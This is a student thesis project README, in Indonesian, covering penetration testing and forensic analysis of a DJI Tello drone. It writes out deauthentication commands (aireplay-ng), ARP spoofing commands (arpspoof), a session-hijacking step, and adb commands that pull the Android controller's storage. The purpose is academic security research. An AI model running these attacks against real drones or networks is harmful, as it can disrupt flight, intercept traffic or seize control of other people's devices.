# 🏁 Tugas Akhir (TA) - Final Project

**Nama Mahasiswa**: Akbar Putra Asenti Priyanto 
**NRP**: 5025211004 
**Judul TA**: Penetration Test dan Analisis Forensik pada Drone Komersial  
**Dosen Pembimbing**: Hudan Studiawan, S.Kom., M.Kom.,Ph.D.  
**Dosen Ko-pembimbing**: Baskoro Adi Pratomo, S.Kom., M.Kom.

---

## 📺 Demo Aplikasi  
[![Demo Aplikasi](https://i.ytimg.com/vi/17bLWl3gKGE/maxresdefault.jpg)](https://www.youtube.com/watch?v=17bLWl3gKGE)  
**Klik gambar di atas untuk menonton demo**
---

*Konten selanjutnya hanya merupakan contoh awalan yang baik. Anda dapat berimprovisasi bila diperlukan.*

## 🛠 Panduan Instalasi & Menjalankan Software  

### Prasyarat  
- Daftar dependensi:
  - Python + pip
  - Wireshark
  - OS Kali Linux (Bisa dijalankan melalui Virtual Machine)
  - Oracle VM VirtualBox (Jika menjalankan serangan melalui VM)
  - DatCon (https://datfile.net/)
- Dependensi Tools Penyerangan:
  - aircrack-ng (Otomatis terinstal pada Kali Linux)
  - arpspoof / dsniff (Otomatis Terinstal pada Kali Linux)
  - djitellopy (https://github.com/damiafuentes/DJITelloPy)
- Dependensi Akuisisi Android:
  - adb (https://developer.android.com/tools/adb)

### Langkah-langkah  
1. **Clone Repository**  
   ```bash
   git clone https://github.com/Informatics-ITS/TA.git
   ```
2. **Instalasi Dependensi**
   ```bash
   cd [folder-proyek]
   pip install -r requirements.txt  # Contoh untuk Python
   npm install  # Contoh untuk Node.js
   ```
3. **Memperoleh IP dan MAC drone dan Kontroler**:

4. **Jalankan Serangan**
   
   - **Skenario Deauthentication Attack**:

   ```sudo airmon-ng start <interface>```

   ```sudo airodump-ng <interface_mon>```
   ```
   sudo iwconfig <interface_mon> channel <channel>
   sudo aireplay-ng --deauth <jumlah paket> -a <MAC Drone> -c <MAC Client> <interface_mon>
   ```

   - **Skenario ARP Spoofing**:
   Sebelum menjalankan serangan, pastikan mesin penyerang terhubung pada jaringan drone DJI Tello.
   ```
   sysctl-w net.ipv4.ip_forward=1
   sudo arpspoof -i wlan0 -t <ip client> <ip drone>
   sudo arpspoof -i wlan0 -t <ip drone> <ip client>
   ```

   - **Skenario Session Hijacking**:
   Sebelum menjalankan serangan, pastikan mesin penyerang terhubung pada jaringan drone DJI Tello.
   ```
   cd hijack
   python tello_control.py
   ```

   - **Capture Jaringan dengan Wireshark**:
   ```sudo wireshark```
   Lakukan capture jaringan pada interface yang digunakan dalam penyerangan.

5. **Akuisisi Kontroler Android**
   - Pertama-tama, download adb (android debug bridge) pada tautan https://developer.android.com/tools/adb:
   - Hubungkan perangkat android menggunakan USB pada mesin.
   - Jalankan command berikut pada direktori download adb: 
   ```
   adb start-server
   adb devices -l
   adb shell ls
   adb pull /storage/emulated/0/
   ```
   - Pada android, log penerbangan DJI Tello ditemukan pada direktori `/0/Android/data/com.ryzerobotics.tello/files/droneLog/`, sedangkan video penerbangan pada direktori `/0/Movies/TelloVideo/`

6. **Proses Log dengan DatCon**
   - Download software DatCon pada ```https://datfile.net/```
   - Saat dibuka, DatCon akan menampilkan GUI. Isi direktori .DAT yang sesuai dan direktori output yang sesuai pada halaman utama DatCon.
   - Pencet tombol "GO!" pada bagian bawah GUI
   - DatCon akan menghasilkan hasil .csv dari .DAT yang dimasukkan.
---

## 📚 Dokumentasi Tambahan

- [![Dokumentasi API]](docs/api.md)
- [![Diagram Arsitektur]](docs/architecture.png)
- [![Struktur Basis Data]](docs/database_schema.sql)

---

## ✅ Validasi

Pastikan proyek memenuhi kriteria berikut sebelum submit:
- Source code dapat di-build/run tanpa error
- Video demo jelas menampilkan fitur utama
- README lengkap dan terupdate
- Tidak ada data sensitif (password, API key) yang ter-expose

---

## ⁉️ Pertanyaan?

Hubungi:
- Penulis: [akbar.putra02.ap@gmail.com]
- Pembimbing Utama: [studiawan@gmail.com]
